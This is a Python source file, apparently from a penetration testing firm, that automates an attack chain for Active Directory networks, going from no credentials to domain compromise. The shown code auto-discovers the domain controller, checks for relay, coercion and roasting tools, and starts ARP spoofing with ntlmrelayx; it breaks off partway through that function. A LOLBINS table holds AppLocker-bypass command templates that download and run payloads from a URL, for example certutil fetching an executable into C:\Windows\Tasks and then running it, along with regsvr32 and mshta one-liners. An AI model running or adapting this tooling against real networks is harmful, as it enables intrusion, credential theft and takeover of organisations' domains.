#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════╗
║  NTLM Relay Attack Chain Automation                              ║
║  Triop AB — For authorized penetration testing only              ║
║                                                                  ║
║  Automated zero-auth to domain compromise:                       ║
║  1. Auto-discovery (DC, network, interfaces, WSUS)               ║
║  2. ARP spoof NTLM capture (zero-auth, no creds needed)         ║
║  3. WPAD poisoning via mitm6/Responder (IPv6 DNS hijack)        ║
║  4. WSUS relay — intercept Windows Update NTLM auth             ║
║  5. NTLM relay via impacket (leverages CVE-2025-33073)          ║
║  6. Multi-method coercion (PetitPotam, DFSCoerce, PrinterBug,   ║
║     ShadowCoerce, MSEven)                                        ║
║  7. Hash cracking (hashcat/john)                                 ║
║  8. PXE boot image credential theft via TFTP (zero-auth)        ║
║  9. NTLM theft file drops (.library-ms/.theme on shares)        ║
║  10. Kerberoasting + AS-REP Roasting (credential harvest)       ║
║  11. AD CS — ESC1-17 enum (Certihound) / ESC1-16 exploit        ║
║  12. SCCM NAA credential theft (sccmhunter)                     ║
║  13. Shadow Credentials (msDS-KeyCredentialLink via PKINIT)     ║
║  14. RBCD abuse (S4U2Proxy impersonation)                       ║
║  15. WebDAV coercion (WebClient HTTP→LDAP relay bypass)         ║
║  16. DHCP coercion (DHCP server machine account relay)          ║
║  17. GPO abuse (pyGPOAbuse scheduled task as SYSTEM)            ║
║  18. WSUS injection + AppLocker bypass (LOLBins/signed updates) ║
║  19. DCSync + DPAPI backup key extraction                        ║
╚══════════════════════════════════════════════════════════════════╝
"""

from __future__ import annotations

import argparse
import ipaddress
import json
import logging
import os
import re
import shutil
import signal
import subprocess
import sys
import textwrap
import threading
import time
from dataclasses import dataclass, field
from datetime import datetime
from pathlib import Path
from typing import Optional

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# Configuration
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

VERSION = "4.4.1"
TOOLS_DIR = Path("/opt/tools")
CVE_DIR = TOOLS_DIR / "CVE-2025-33073"

COERCION_METHODS = ["DFSCoerce", "PetitPotam", "PrinterBug", "ShadowCoerce", "MSEven"]

# LOLBins that bypass AppLocker default rules (Microsoft-signed, in trusted paths)
LOLBINS = {
    "mshta": 'mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""{cmd}"", 0:close")',
    "certutil": 'cmd /c certutil -urlcache -split -f {url} C:\\Windows\\Tasks\\svc.exe & C:\\Windows\\Tasks\\svc.exe',
    "msbuild": 'C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe C:\\Windows\\Tasks\\payload.csproj',
    "regsvr32": 'regsvr32 /s /n /u /i:{url} scrobj.dll',
    "rundll32": 'rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WScript.Shell").Run("{cmd}")',
    "wmic": 'wmic os get /format:"{url}"',
    "cmstp": 'cmstp.exe /ni /s C:\\Windows\\Tasks\\payload.inf',
}

# AppLocker-safe writable directories under default Windows trusted paths
APPLOCKER_SAFE_PATHS = [
    "C:\\Windows\\Tasks",
    "C:\\Windows\\Temp",
    "C:\\Windows\\tracing",
    "C:\\Windows\\System32\\spool\\drivers\\color",
    "C:\\Windows\\SoftwareDistribution",
]

# WSUS default ports
WSUS_HTTP_PORT = 8530
WSUS_HTTPS_PORT = 8531

WORDLISTS = [
    Path("/usr/share/wordlists/rockyou.txt"),
    Path("/usr/share/wordlists/rockyou.txt.gz"),
    Path("/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt"),
    Path("/usr/share/wordlists/fasttrack.txt"),
]


@dataclass
class Config:
    """Attack chain configuration — auto-populated by discovery."""

    # Credentials (optional for zero-auth ARP mode)
    username: str = ""
    password: str = ""
    nthash: str = ""
    domain: str = ""

    # Network
    attacker_ip: str = ""
    iface: str = ""
    gateway: str = ""
    target_net: str = ""
    specific_target: str = ""
    dc_ip: str = ""
    dc_fqdn: str = ""

    # Attack options
    method: str = ""
    custom_cmd: str = ""
    use_socks: bool = False
    smb_signing: bool = False
    no_dcsync: bool = False
    no_cleanup: bool = False
    no_arp: bool = False
    batch: bool = False
    poison_duration: int = 120

    # WPAD/WSUS options
    wsus_server: str = ""
    wsus_port: int = 0
    wsus_https: bool = False
    wsus_certfile: str = ""
    wsus_keyfile: str = ""
    no_wpad: bool = False
    no_wsus: bool = False
    sniff_duration: int = 30

    # AppLocker bypass options
    applocker: bool = False
    lolbin: str = ""
    payload_url: str = ""

    # AD CS options
    no_adcs: bool = False
    ca_name: str = ""
    esc_victim_user: str = ""      # ESC9/ESC10 victim — UPN-swap target
    esc_victim_password: str = ""

    # Roasting options
    no_roast: bool = False

    # NTLM theft file drop options
    no_ntlm_theft: bool = False

    # SCCM options
    no_sccm: bool = False
    sccm_server: str = ""

    # Shadow Credentials / RBCD options
    no_shadow_creds: bool = False
    no_rbcd: bool = False
    machine_account: str = ""
    machine_password: str = ""

    # DPAPI options
    no_dpapi: bool = False

    # Runtime
    phase: str = "full"
    dry_run: bool = False
    verbose: bool = False
    work_dir: Path = field(default_factory=lambda: Path("."))

    # State
    bg_processes: list = field(default_factory=list, repr=False)
    start_time: float = field(default_factory=time.time, repr=False)

    @property
    def has_creds(self) -> bool:
        return bool(self.username and (self.password or self.nthash))

    @property
    def auth_string(self) -> str:
        """Impacket-style DOMAIN/user:pass string."""
        if self.nthash:
            return f"{self.domain}/{self.username}"
        return f"{self.domain}/{self.username}:{self.password}"

    @property
    def auth_args(self) -> list[str]:
        """Auth arguments for impacket tools."""
        if self.nthash:
            return [f"{self.domain}/{self.username}", "-hashes", f":{self.nthash}"]
        return [f"{self.domain}/{self.username}:{self.password}"]

    def cleanup(self):
        """Kill all background processes and close file handles."""
        for proc in self.bg_processes:
            try:
                if hasattr(proc, 'poll') and proc.poll() is None:
                    os.killpg(proc.pid, signal.SIGTERM)
                    proc.wait(timeout=5)
            except Exception:
                try:
                    proc.kill()
                except Exception:
                    pass
            # Close tracked file handles
            try:
                fh = getattr(proc, '_outfile', None)
                if fh and fh != subprocess.DEVNULL:
                    fh.close()
            except Exception:
                pass
        self.bg_processes.clear()


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# Logging — colors, emojis, timestamps, file output
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

class Colors:
    RED = "\033[0;31m"
    BOLD_RED = "\033[1;31m"
    GREEN = "\033[0;32m"
    BOLD_GREEN = "\033[1;32m"
    YELLOW = "\033[1;33m"
    BOLD_YELLOW = "\033[1;33m"
    BLUE = "\033[0;34m"
    BOLD_BLUE = "\033[1;34m"
    MAGENTA = "\033[0;35m"
    BOLD_MAGENTA = "\033[1;35m"
    CYAN = "\033[0;36m"
    BOLD_CYAN = "\033[1;36m"
    WHITE = "\033[1;37m"
    DIM = "\033[2m"
    BOLD = "\033[1m"
    NC = "\033[0m"


C = Colors


class EmojiFormatter(logging.Formatter):
    """Console formatter with colors, emojis, and timestamps."""

    FORMATS = {
        logging.DEBUG: f"{C.DIM}[%(asctime)s] 🔍 %(message)s{C.NC}",
        logging.INFO: f"{C.BLUE}[%(asctime)s]{C.NC} 🔵 %(message)s",
        logging.WARNING: f"{C.YELLOW}[%(asctime)s]{C.NC} ⚠️  %(message)s",
        logging.ERROR: f"{C.RED}[%(asctime)s]{C.NC} ❌ %(message)s",
        logging.CRITICAL: f"{C.BOLD_RED}[%(asctime)s]{C.NC} 💀 %(message)s",
        25: f"{C.GREEN}[%(asctime)s]{C.NC} ✅ %(message)s",  # SUCCESS
        26: f"{C.CYAN}   ℹ️  %(message)s{C.NC}",  # INFO_DETAIL
        27: f"{C.BOLD_MAGENTA}%(message)s{C.NC}",  # PHASE
    }

    def format(self, record):
        fmt = self.FORMATS.get(record.levelno, self.FORMATS[logging.INFO])
        formatter = logging.Formatter(fmt, datefmt="%H:%M:%S")
        return formatter.format(record)


class FileFormatter(logging.Formatter):
    """Plain-text formatter for log files (no ANSI codes)."""

    def format(self, record):
        ts = datetime.fromtimestamp(record.created).strftime("%Y-%m-%d %H:%M:%S")
        level = {25: "OK", 26: "INFO", 27: "PHASE"}.get(record.levelno, record.levelname)
        return f"[{ts}] [{level}] {record.getMessage()}"


# Custom log levels
logging.addLevelName(25, "SUCCESS")
logging.addLevelName(26, "DETAIL")
logging.addLevelName(27, "PHASE")

log = logging.getLogger("ntlm-chain")
log.setLevel(logging.DEBUG)

# Console handler
_console = logging.StreamHandler(sys.stdout)
_console.setFormatter(EmojiFormatter())
_console.setLevel(logging.INFO)
log.addHandler(_console)

# File handler (added later when work_dir is known)
_file_handler: Optional[logging.FileHandler] = None


def setup_file_logging(work_dir: Path):
    global _file_handler
    log_path = work_dir / "chain.log"
    _file_handler = logging.FileHandler(log_path, encoding="utf-8")
    _file_handler.setFormatter(FileFormatter())
    _file_handler.setLevel(logging.DEBUG)
    log.addHandler(_file_handler)
    log.debug(f"Logging to {log_path}")


def ok(msg: str):
    log.log(25, msg)

def detail(msg: str):
    log.log(26, msg)

def phase_header(title: str):
    bar = "━" * 56
    log.log(27, f"\n{bar}")
    log.log(27, f"  🎯 {title}")
    log.log(27, bar + "\n")


def success_box(msg: str):
    print(f"\n{C.BOLD_GREEN}╔══════════════════════════════════════════════════════╗")
    print(f"║  🏆 {msg:<50} ║")
    print(f"╚══════════════════════════════════════════════════════╝{C.NC}\n")
    log.log(25, f"SUCCESS: {msg}")


def fail_box(msg: str):
    print(f"\n{C.BOLD_RED}╔══════════════════════════════════════════════════════╗")
    print(f"║  💀 {msg:<50} ║")
    print(f"╚══════════════════════════════════════════════════════╝{C.NC}\n")
    log.error(f"FAILED: {msg}")


def separator():
    print(f"{C.DIM}{'─' * 56}{C.NC}")


def banner():
    print(f"""{C.BOLD_RED}
       _   ___      _       _       ___
      /_\\ |   \\    /_\\ _  _| |_ ___| _ \\__ __ ___ _
     / _ \\| |) |  / _ \\ || |  _/ _ \\  _/\\ V  V / ' \\
    /_/ \\_\\___/  /_/ \\_\\_,_|\\__\\___/_|   \\_/\\_/|_||_|
{C.NC}""")
    print(f"{C.BOLD_CYAN}    ⚡ Zero-Auth to Domain Admin — Attack Chain{C.NC}")
    print(f"{C.DIM}    ARP | WPAD | WSUS | PXE | AD CS | SCCM | Roast | RBCD | GPO | DCSync{C.NC}")
    print(f"{C.DIM}    🔧 v{VERSION} | Triop AB | Authorized testing only{C.NC}")
    print(f"{C.DIM}    📋 Full log: <work_dir>/chain.log{C.NC}\n")
    separator()


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# Shell helpers
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def run(cmd: list[str], cfg: Config, timeout: int = 300,
        capture: bool = True, bg: bool = False,
        outfile: Optional[Path] = None) -> subprocess.CompletedProcess | subprocess.Popen:
    """Run a command, log it, optionally save output to file."""
    cmd_str = " ".join(str(c) for c in cmd)
    log.debug(f"$ {cmd_str}")

    if cfg.dry_run and not bg:
        print(f"{C.YELLOW}  [DRY RUN] {cmd_str}{C.NC}")
        return subprocess.CompletedProcess(cmd, 0, stdout="", stderr="")

    if bg:
        f_out = None
        try:
            f_out = open(outfile, "w") if outfile else subprocess.DEVNULL
            proc = subprocess.Popen(
                cmd, stdout=f_out, stderr=subprocess.STDOUT,
                text=True, preexec_fn=os.setpgrp
            )
            proc._outfile = f_out  # track for cleanup
            cfg.bg_processes.append(proc)
            return proc
        except FileNotFoundError:
            log.error(f"Command not found: {cmd[0]}")
            if f_out and f_out != subprocess.DEVNULL:
                f_out.close()
            return subprocess.CompletedProcess(cmd, 127, stdout="", stderr="not found")
        except Exception as e:
            log.error(f"Failed to start background process: {e}")
            if f_out and f_out != subprocess.DEVNULL:
                f_out.close()
            return subprocess.CompletedProcess(cmd, 1, stdout="", stderr=str(e))

    try:
        result = subprocess.run(
            cmd, capture_output=capture, text=True, timeout=timeout
        )
        if outfile:
            outfile.write_text(result.stdout + (result.stderr or ""))
        # Stream output if not capturing
        if not capture and result.stdout:
            print(result.stdout, end="")
        return result
    except subprocess.TimeoutExpired as e:
        log.warning(f"Command timed out after {timeout}s: {cmd_str}")
        # Persist any output captured before the timeout — required for
        # phases like passive_sniff() that intentionally run to timeout.
        # subprocess.TimeoutExpired carries .stdout/.stderr (bytes or str
        # depending on text= flag); coerce to str for write_text.
        if outfile:
            def _to_str(x):
                if x is None: return ""
                return x.decode(errors="replace") if isinstance(x, bytes) else x
            outfile.write_text(_to_str(e.stdout) + _to_str(e.stderr))
        return subprocess.CompletedProcess(cmd, 1, stdout="", stderr="timeout")
    except FileNotFoundError:
        log.error(f"Command not found: {cmd[0]}")
        return subprocess.CompletedProcess(cmd, 127, stdout="", stderr="not found")


def _nxc_auth_args(cfg) -> list[str]:
    """Build nxc authentication arguments, supporting both password and nthash."""
    if cfg.nthash:
        return ["-u", cfg.username, "-H", cfg.nthash, "-d", cfg.domain]
    return ["-u", cfg.username, "-p", cfg.password, "-d", cfg.domain]


def _bloody_auth_args(cfg) -> list[str]:
    """Build bloodyAD authentication arguments."""
    args = ["-d", cfg.domain, "-u", cfg.username, "--host", cfg.dc_ip]
    if cfg.nthash:
        args += ["-p", f":{cfg.nthash}"]
    else:
        args += ["-p", cfg.password]
    return args


def _first_line(text: str) -> str:
    """Safely get first non-empty line from text, or empty string."""
    lines = text.strip().splitlines()
    return lines[0] if lines else ""


def tool_exists(name: str) -> bool:
    return shutil.which(name) is not None


def find_tool(*names: str, paths: list[Path] | None = None) -> Optional[str]:
    """Find a tool by checking multiple names and paths."""
    for name in names:
        if shutil.which(name):
            return name
    if paths:
        for p in paths:
            if p.exists():
                return f"python3 {p}"
    return None


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# Auto-Discovery
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

class AutoDiscovery:
    """Detect network config: interface, IPs, domain, DC, gateway, subnet."""

    def __init__(self, cfg: Config):
        self.cfg = cfg
        self.detected = 0

    def run_all(self):
        phase_header("AUTO-DISCOVERY")
        self._detect_interface()
        self._detect_attacker_ip()
        self._detect_gateway()
        self._detect_subnet()
        if self.cfg.has_creds or self.cfg.phase != "arp":
            self._detect_domain()
            self._detect_dc_ip()
            self._detect_dc_fqdn()
        ok(f"Auto-discovery complete ({self.detected} values detected)")

    def _set(self, attr: str, value: str, method: str):
        """Set config attribute and log it."""
        if value:
            setattr(self.cfg, attr, value)
            ok(f"{attr.replace('_', ' ').title()}: {value} (auto: {method})")
            self.detected += 1

    def _skip(self, attr: str):
        val = getattr(self.cfg, attr)
        if val:
            detail(f"{attr.replace('_', ' ').title()}: {val} (user-specified)")
            return True
        return False

    def _detect_interface(self):
        # If user supplied an iface, validate it exists — fall back to auto if not
        if self.cfg.iface:
            if Path(f"/sys/class/net/{self.cfg.iface}").exists():
                detail(f"Iface: {self.cfg.iface} (user-specified)")
                return
            log.warning(f"Iface '{self.cfg.iface}' does not exist — auto-detecting")
            self.cfg.iface = ""
        try:
            out = subprocess.check_output(
                ["ip", "route", "show", "default"], text=True, timeout=5,
                stderr=subprocess.DEVNULL
            )
            for line in out.splitlines():
                if "default" in line:
                    parts = line.split()
                    idx = parts.index("dev") + 1 if "dev" in parts else -1
                    if idx > 0 and idx < len(parts):
                        self._set("iface", parts[idx], "default route")
                        return
        except Exception:
            pass
        log.warning("Could not detect network interface")

    def _detect_attacker_ip(self):
        if self._skip("attacker_ip"):
            return
        try:
            out = subprocess.check_output(
                ["ip", "-4", "route", "get", "1.1.1.1"], text=True, timeout=5,
                stderr=subprocess.DEVNULL
            )
            m = re.search(r"src (\d+\.\d+\.\d+\.\d+)", out)
            if m:
                self._set("attacker_ip", m.group(1), f"interface {self.cfg.iface}")
                return
        except Exception:
            pass
        # Fallback: from interface
        if self.cfg.iface:
            try:
                out = subprocess.check_output(
                    ["ip", "-4", "addr", "show", self.cfg.iface], text=True, timeout=5,
                    stderr=subprocess.DEVNULL
                )
                m = re.search(r"inet (\d+\.\d+\.\d+\.\d+)", out)
                if m:
                    self._set("attacker_ip", m.group(1), self.cfg.iface)
                    return
            except Exception:
                pass
        log.error("Could not detect attacker IP — specify with -a")

    def _detect_gateway(self):
        if self._skip("gateway"):
            return
        try:
            out = subprocess.check_output(
                ["ip", "route", "show", "default"], text=True, timeout=5,
                stderr=subprocess.DEVNULL
            )
            m = re.search(r"default via (\d+\.\d+\.\d+\.\d+)", out)
            if m:
                self._set("gateway", m.group(1), "default route")
                return
        except Exception:
            pass
        if self.cfg.dc_ip:
            self.cfg.gateway = self.cfg.dc_ip
            log.warning(f"Gateway: {self.cfg.dc_ip} (using DC IP as fallback)")

    def _detect_subnet(self):
        if self.cfg.target_net or self.cfg.specific_target:
            if self.cfg.target_net:
                detail(f"Target net: {self.cfg.target_net} (user-specified)")
            return
        if self.cfg.iface:
            try:
                out = subprocess.check_output(
                    ["ip", "-4", "addr", "show", self.cfg.iface], text=True, timeout=5,
                    stderr=subprocess.DEVNULL
                )
                m = re.search(r"inet (\d+\.\d+\.\d+\.\d+/\d+)", out)
                if m:
                    net = str(ipaddress.ip_network(m.group(1), strict=False))
                    self._set("target_net", net, self.cfg.iface)
                    return
            except Exception:
                pass
        log.error("Could not detect target subnet — specify with -t")

    def _detect_domain(self):
        if self._skip("domain"):
            return

        # Method 1: resolv.conf (search/domain directives)
        resolv = Path("/etc/resolv.conf")
        if resolv.exists():
            for line in resolv.read_text().splitlines():
                if line.startswith("search "):
                    dom = line.split()[1] if len(line.split()) > 1 else ""
                    # Skip generic/cloud domains
                    if dom and "." in dom and not dom.endswith((".internal", ".local.cloud", ".amazonaws.com", ".compute.internal")):
                        self._set("domain", dom, "resolv.conf")
                        return
                if line.startswith("domain "):
                    dom = line.split()[1] if len(line.split()) > 1 else ""
                    if dom and not dom.endswith((".internal", ".amazonaws.com", ".compute.internal")):
                        self._set("domain", dom, "resolv.conf")
                        return

        # Method 2: Reverse DNS on the gateway or DC IP
        target_ip = self.cfg.dc_ip or self.cfg.gateway
        if target_ip and tool_exists("nmap"):
            try:
                out = subprocess.check_output(
                    ["nmap", "-sn", "-Pn", "--system-dns", target_ip],
                    timeout=10, text=True, stderr=subprocess.DEVNULL
                )
                # Look for FQDN like "dc01.corp.local" (not IP addresses)
                fqdn_match = re.search(r"for\s+([a-zA-Z][a-zA-Z0-9-]+\.[a-zA-Z0-9.-]+)", out)
                if fqdn_match:
                    fqdn = fqdn_match.group(1)
                    # Extract domain from FQDN (remove hostname)
                    parts = fqdn.split(".")
                    if len(parts) >= 3:
                        dom = ".".join(parts[1:])
                    elif len(parts) == 2:
                        dom = fqdn
                    else:
                        dom = ""
                    if dom and not re.match(r"^\d+\.\d+", dom):  # Not an IP
                        self._set("domain", dom, "reverse DNS")
                        return
            except Exception:
                pass

        # Method 3: LDAP rootDSE query against DC (zero-auth)
        if self.cfg.dc_ip:
            try:
                out = subprocess.check_output(
                    ["ldapsearch", "-x", "-H", f"ldap://{self.cfg.dc_ip}",
                     "-s", "base", "-b", "", "defaultNamingContext"],
                    timeout=10, text=True, stderr=subprocess.DEVNULL
                )
                # Parse "defaultNamingContext: DC=corp,DC=local"
                dn_match = re.search(r"defaultNamingContext:\s*(DC=.+)", out, re.IGNORECASE)
                if dn_match:
                    dom = dn_match.group(1).replace("DC=", "").replace(",", ".")
                    self._set("domain", dom, "LDAP rootDSE")
                    return
            except Exception:
                pass

        # Method 4: SMB null session (nxc)
        if self.cfg.dc_ip and tool_exists("nxc"):
            try:
                out = subprocess.check_output(
                    ["nxc", "smb", self.cfg.dc_ip, "-u", "", "-p", ""],
                    timeout=15, text=True, stderr=subprocess.DEVNULL
                )
                # Parse "domain:CORP.LOCAL" from nxc output
                dom_match = re.search(r"domain:(\S+)", out, re.IGNORECASE)
                if dom_match:
                    dom = dom_match.group(1)
                    if "." in dom:
                        self._set("domain", dom, "SMB null session")
                        return
            except Exception:
                pass

        log.error("Could not detect domain — specify with -d")

    def _detect_dc_ip(self):
        if self._skip("dc_ip"):
            return
        domain = self.cfg.domain
        if not domain:
            return
        # SRV lookup
        if tool_exists("dig"):
            try:
                out = subprocess.check_output(
                    ["dig", "+short", "SRV", f"_ldap._tcp.dc._msdcs.{domain}"],
                    text=True, timeout=10, stderr=subprocess.DEVNULL
                )
                lines = sorted(out.strip().splitlines())
                if lines:
                    host = lines[0].split()[-1].rstrip(".")
                    out2 = subprocess.check_output(
                        ["dig", "+short", "A", host], text=True, timeout=5,
                        stderr=subprocess.DEVNULL
                    )
                    ip = out2.strip().splitlines()[0] if out2.strip() else ""
                    if ip:
                        self._set("dc_ip", ip, "DNS SRV _ldap._tcp")
                        return
            except Exception:
                pass
        # Fallback: resolve domain directly
        if tool_exists("dig"):
            try:
                out = subprocess.check_output(
                    ["dig", "+short", "A", domain], text=True, timeout=5,
                    stderr=subprocess.DEVNULL
                )
                ip = out.strip().splitlines()[0] if out.strip() else ""
                if ip:
                    self._set("dc_ip", ip, f"DNS A {domain}")
                    return
            except Exception:
                pass
        log.error("Could not detect DC IP — specify with --dc-ip")

    def _detect_dc_fqdn(self):
        if self._skip("dc_fqdn"):
            return
        dc_ip = self.cfg.dc_ip
        domain = self.cfg.domain
        if not dc_ip:
            return
        # Reverse DNS
        if tool_exists("dig"):
            try:
                out = subprocess.check_output(
                    ["dig", "+short", "-x", dc_ip], text=True, timeout=5,
                    stderr=subprocess.DEVNULL
                )
                fqdn = out.strip().splitlines()[0].rstrip(".") if out.strip() else ""
                if fqdn:
                    self._set("dc_fqdn", fqdn, "reverse DNS")
                    return
            except Exception:
                pass
        # nxc fingerprint
        if tool_exists("nxc"):
            try:
                out = subprocess.check_output(
                    ["nxc", "smb", dc_ip], text=True, timeout=15, stderr=subprocess.DEVNULL
                )
                # nxc prints "(name:HOST) (domain:DOM)" — \S+ would eat the ')'
                m = re.search(r"name:([^\s)]+)", out, re.IGNORECASE)
                if m:
                    self._set("dc_fqdn", f"{m.group(1)}.{domain}", "nxc SMB")
                    return
            except Exception:
                pass
        # Guess
        self.cfg.dc_fqdn = f"DC.{domain}"
        log.warning(f"DC FQDN: {self.cfg.dc_fqdn} (guessed — override with --dc-fqdn)")


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# Prerequisites
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def check_prerequisites(cfg: Config) -> bool:
    log.info("🔧 Checking prerequisites...")
    missing = False

    # Core exploit
    if not (CVE_DIR / "CVE-2025-33073.py").exists():
        log.error(f"CVE-2025-33073 PoC not found at {CVE_DIR}")
        missing = True

    # Required tools
    for tool in ["nxc", "impacket-findDelegation", "impacket-ntlmrelayx",
                 "impacket-secretsdump", "python3", "ip"]:
        if tool_exists(tool):
            log.debug(f"  ✓ {tool}")
        else:
            log.error(f"Required tool not found: {tool}")
            missing = True

    # Optional
    if tool_exists("dig"):
        ok("dig available (DNS discovery)")
    else:
        log.warning("dig not found — DNS auto-discovery limited (apt install dnsutils)")

    if (TOOLS_DIR / "krbrelayx").is_dir():
        ok("krbrelayx found")
    else:
        log.warning("krbrelayx not found (optional)")

    if tool_exists("arpspoof"):
        ok("arpspoof available (Layer 2 fallback)")
    elif tool_exists("bettercap"):
        ok("bettercap available (Layer 2 fallback)")
    else:
        log.warning("No ARP spoof tool (optional — apt install dsniff or bettercap)")

    if tool_exists("hashcat"):
        ok("hashcat available (hash cracking)")
    elif tool_exists("john"):
        ok("john available (hash cracking)")
    else:
        log.warning("No hash cracker found (optional — apt install hashcat)")

    # Passive discovery
    if tool_exists("tcpdump"):
        ok("tcpdump available (passive WPAD/WSUS/LLMNR sniffing)")
    else:
        log.warning("tcpdump not found (optional — apt install tcpdump)")

    # PXE tools
    pxethiefy_found = find_tool(
        "pxethiefy",
        paths=[TOOLS_DIR / "pxethiefy" / "pxethiefy.py"]
    )
    if pxethiefy_found:
        ok("pxethiefy available (PXE/SCCM credential extraction)")
    else:
        log.warning("pxethiefy not found (optional — manual TFTP extraction still works)")

    if tool_exists("tftp") or tool_exists("atftp"):
        ok("TFTP client available (PXE image download)")
    else:
        log.warning("No TFTP client found (optional — apt install tftp)")

    if tool_exists("wimlib-imagex"):
        ok("wimtools available (WIM image mounting)")
    else:
        log.warning("wimtools not found (optional — apt install wimtools)")

    # WPAD tools
    if tool_exists("mitm6"):
        ok("mitm6 available (IPv6 WPAD poisoning)")
    else:
        log.warning("mitm6 not found (optional — pipx install mitm6)")

    if tool_exists("responder"):
        ok("responder available (LLMNR/WPAD poisoning)")
    else:
        log.warning("responder not found (optional — apt install responder)")

    # WSUS tools
    if tool_exists("wsuks"):
        ok("wsuks available (WSUS exploitation)")
    else:
        log.warning("wsuks not found (optional — pipx install wsuks)")

    # AD CS tools
    if tool_exists("certipy"):
        ok("certipy available (AD CS ESC1-ESC16 exploitation)")
    else:
        log.warning("certipy not found (optional — apt install certipy-ad)")

    # Roasting tools
    if tool_exists("impacket-GetUserSPNs"):
        ok("GetUserSPNs available (Kerberoasting)")
    if tool_exists("impacket-GetNPUsers"):
        ok("GetNPUsers available (AS-REP Roasting)")

    # SCCM tools
    sccmhunter_path = find_tool("sccmhunter",
        paths=[TOOLS_DIR / "sccmhunter" / "sccmhunter.py"])
    if sccmhunter_path:
        ok("sccmhunter available (SCCM NAA extraction)")
    else:
        log.warning("sccmhunter not found (optional)")

    # Shadow Credentials
    pywhisker_path = find_tool("pywhisker",
        paths=[TOOLS_DIR / "pywhisker" / "pywhisker.py"])
    if pywhisker_path:
        ok("pywhisker available (Shadow Credentials)")
    else:
        log.warning("pywhisker not found (optional — ntlmrelayx --shadow-credentials still works)")

    # RBCD / delegation tools
    if tool_exists("impacket-addcomputer"):
        ok("addcomputer available (RBCD machine account)")
    if tool_exists("impacket-getST"):
        ok("getST available (S4U2Proxy)")

    # DPAPI
    if tool_exists("impacket-dpapi"):
        ok("impacket-dpapi available (DPAPI backup key extraction)")

    if missing:
        log.error("Missing prerequisites. Install with: sudo ./kali-install.sh")
        return False
    ok("All prerequisites satisfied")
    return True


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# Phase 0: ARP Spoof + Credential Capture
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def discover_live_hosts(cfg: Config) -> list[str]:
    """Scan subnet for live hosts."""
    log.info("📡 Discovering live hosts...")
    hosts_file = cfg.work_dir / "live-hosts.txt"

    if tool_exists("nmap"):
        result = run(["nmap", "-sn", "-n", cfg.target_net], cfg, timeout=120)
        hosts = re.findall(r"Nmap scan report for (\d+\.\d+\.\d+\.\d+)", result.stdout)
    elif tool_exists("arp-scan"):
        result = run(["arp-scan", "-I", cfg.iface or "eth0", cfg.target_net], cfg, timeout=60)
        hosts = re.findall(r"^(\d+\.\d+\.\d+\.\d+)", result.stdout, re.MULTILINE)
    else:
        log.error("Need nmap or arp-scan for host discovery")
        return []

    # Filter out self and gateway
    hosts = [h for h in hosts if h not in (cfg.attacker_ip, cfg.gateway)]
    hosts_file.write_text("\n".join(hosts) + "\n")

    if hosts:
        ok(f"Found {len(hosts)} live host(s)")
        for h in hosts:
            detail(h)
    else:
        log.warning("No live hosts found")
    return hosts


def arp_spoof_relay(target: str, cfg: Config) -> bool:
    """ARP spoof target ↔ gateway and relay NTLM auth. Returns True if creds captured."""
    gateway = cfg.gateway
    log.info(f"🕸️  ARP spoof: {target} ↔ {gateway}")

    if cfg.dry_run:
        log.warning(f"Dry run — would ARP spoof {target} ↔ {gateway}")
        return True

    spoof_tool = find_tool("arpspoof", "bettercap")
    if not spoof_tool:
        log.error("No ARP spoof tool found (need arpspoof or bettercap)")
        return False

    relay_output = cfg.work_dir / f"arp-relay-{target}.txt"
    hash_output = cfg.work_dir / "arp-relay-hashes"
    bg_procs = []

    # Enable IP forwarding
    old_forward = "0"
    try:
        old_forward = Path("/proc/sys/net/ipv4/ip_forward").read_text().strip()
        Path("/proc/sys/net/ipv4/ip_forward").write_text("1")
        log.debug("IP forwarding enabled")
    except OSError as e:
        log.error(f"Cannot enable IP forwarding: {e}")
        return False

    try:
        # Start ntlmrelayx
        log.info("🎣 Starting ntlmrelayx listener...")
        relay_proc = run(
            ["impacket-ntlmrelayx", "-t", target, "-smb2support",
             "--no-http-server", "-of", str(hash_output)],
            cfg, bg=True, outfile=relay_output
        )
        if not hasattr(relay_proc, 'poll'):
            log.error("Failed to start ntlmrelayx")
            return False
        bg_procs.append(relay_proc)
        time.sleep(2)
        if relay_proc.poll() is not None:
            log.error(f"ntlmrelayx exited immediately (code {relay_proc.returncode})")
            return False

        # Start ARP spoof
        iface = cfg.iface or "eth0"
        if "bettercap" in spoof_tool:
